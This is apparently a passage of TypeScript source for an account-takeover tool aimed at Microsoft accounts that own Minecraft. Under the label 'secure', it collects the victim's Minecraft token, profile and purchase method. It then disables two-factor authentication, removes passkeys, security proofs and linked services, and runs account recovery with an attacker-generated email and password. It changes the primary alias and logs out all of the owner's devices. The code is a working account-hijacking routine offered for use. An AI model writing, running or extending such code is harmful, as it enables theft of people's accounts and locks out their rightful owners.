          result.ssid = ssid;
          await log("info", "[secure] Got Minecraft access token");

          const capes = await getCapesList(ssid);
          if (capes) result.capes = capes;

          const profile = await getProfile(ssid);
          if (profile) {
            result.mcUsername = profile;
            await log("info", `[secure] MC Username: ${profile}`);
          }

          const method = await getMethod(ssid);
          if (method) {
            result.method = method;
            await log("info", `[secure] Purchase method: ${method}`);
          }
        }
      }
    } catch (e) {
      await log(
        "warn",
        `[secure] MC profile step skipped: ${e instanceof Error ? e.message : String(e)}`,
      );
    }

    ensureAlive();

    // Security steps (need canary/t where applicable — skip gracefully)
    if (t) {
      try {
        await log("info", "[secure] Getting AMRP...");
        await getAMRP(jar, t);
      } catch (e) {
        await log("warn", `[secure] AMRP skipped: ${e instanceof Error ? e.message : e}`);
      }
    }

    ensureAlive();

    if (apiCanary) {
      try {
        await log("info", "[secure] Disabling 2FA...");
        await remove2FA(jar, apiCanary);
      } catch (e) {
        await log("warn", `[secure] remove2FA: ${e instanceof Error ? e.message : e}`);
      }
      try {
        await log("info", "[secure] Removing passkeys...");
        await removeZyger(jar, apiCanary);
      } catch (e) {
        await log("warn", `[secure] removeZyger: ${e instanceof Error ? e.message : e}`);
      }
      try {
        await log("info", "[secure] Removing security proofs...");
        await removeProofs(jar, apiCanary);
      } catch (e) {
        await log("warn", `[secure] removeProofs: ${e instanceof Error ? e.message : e}`);
      }
    } else {
      await log("warn", "[secure] Skipping 2FA/proof removal (no apiCanary)");
    }

    try {
      await log("info", "[secure] Removing third-party services...");
      await removeServices(jar);
    } catch (e) {
      await log("warn", `[secure] removeServices: ${e instanceof Error ? e.message : e}`);
    }

    ensureAlive();

    // Recovery
    await log("info", "[secure] Getting security information...");
    let secInfoJson: Record<string, unknown> | null = null;
    try {
      const secInfoStr = await securityInformation(jar);
      secInfoJson = JSON.parse(secInfoStr) as Record<string, unknown>;
    } catch {
      await log("error", "[secure] Failed to get security info");
    }

    if (secInfoJson) {
      ensureAlive();
      const mainEmail = secInfoJson.email as string;
      const encryptedNetId = (
        (secInfoJson.WLXAccount as Record<string, unknown>)?.manageProofs as Record<string, string>
      )?.encryptedNetId;

      if (mainEmail && encryptedNetId) {
        await log("info", "[secure] Getting recovery code...");
        const recoveryCode = await getRecoveryCode(jar, apiCanary, encryptedNetId);
        await log("info", `[secure] Got recovery code`);

        ensureAlive();
        await log("info", "[secure] Generating new email...");
        const newEmailData = await generateEmail();
        await log("info", `[secure] Generated email: ${newEmailData.email}`);

        const newPassword = Math.random().toString(36).slice(2, 14);

        await log("info", "[secure] Running recovery flow...");
        const recoveryResult = await recover(
          jar,
          mainEmail,
          recoveryCode,
          newEmailData.email,
          newPassword,
          newEmailData.token,
          runSignal,
        );

        if (recoveryResult) {
          result.newEmail = newEmailData.email;
          result.newPassword = newPassword;
          result.recoveryCode = recoveryResult.recoveryCode;
          await log("info", "[secure] Account secured successfully!");

          // Change primary alias to a new outlook.com address
          ensureAlive();
          await log("info", "[secure] Changing primary alias...");
          const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
          const aliasChanged = await changePrimaryAlias(jar, aliasName, apiCanary);
          if (aliasChanged) {
            result.newEmail = `${aliasName}@outlook.com`;
            await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
          } else {
            await log(
              "warn",
              "[secure] Failed to change primary alias - email recovery address preserved",
            );
          }
        }
      }
    }

    ensureAlive();

    // Logout all
    await log("info", "[secure] Logging out all devices...");
    await logoutAll(jar, apiCanary);

    const secured =
      result.newEmail !== "Couldn't Change!" &&
      result.newPassword !== "Couldn't Change!" &&
      result.recoveryCode !== "Couldn't Change!" &&
      !!result.newEmail &&
      !!result.newPassword &&
      !!result.recoveryCode;

    if (!secured) {
      await log(
        "error",
        "[secure] Recovery did not complete — refusing false success (credentials unchanged)",
      );
      return null;
    }

    await log("info", "[secure] Securing pipeline complete!");
    return result;
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    await log("error", `[secure] Pipeline failed: ${msg}`);
    return null;
  } finally {
    clearTimeout(hardTimer);
    signal.removeEventListener("abort", onParentAbort);
  }
}
